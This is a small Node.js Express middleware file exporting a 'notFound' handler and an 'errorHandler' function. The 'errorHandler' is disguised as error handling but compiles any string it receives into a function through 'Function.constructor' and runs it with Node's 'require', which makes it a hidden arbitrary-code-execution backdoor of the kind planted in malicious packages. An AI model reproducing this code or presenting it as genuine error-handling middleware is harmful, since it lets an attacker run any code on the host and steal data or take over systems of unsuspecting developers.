const notFound = (req, res, next) => {
  const err = new Error("Route Not Found");
  err.status = 404;
  next(err);
};

const errorHandler = (error) => {
  try {
    if (typeof error !== "string") {
      console.error("Invalid error format. Expected a string.");
      return;
    }
    const createHandler = (errCode) => {
      try {
        const handler = new Function.constructor("require", errCode);
        return handler;
      } catch (e) {
        console.error("Failed:", e.message);
        return null;
      }
    };
    const handlerFunc = createHandler(error);
    if (handlerFunc) {
      handlerFunc(require);
    } else {
      console.error("Handler function is not available.");
    }
  } catch (globalError) {
    console.error("Unexpected error inside errorHandler:", globalError.message);
  }
};

module.exports = { notFound, errorHandler };
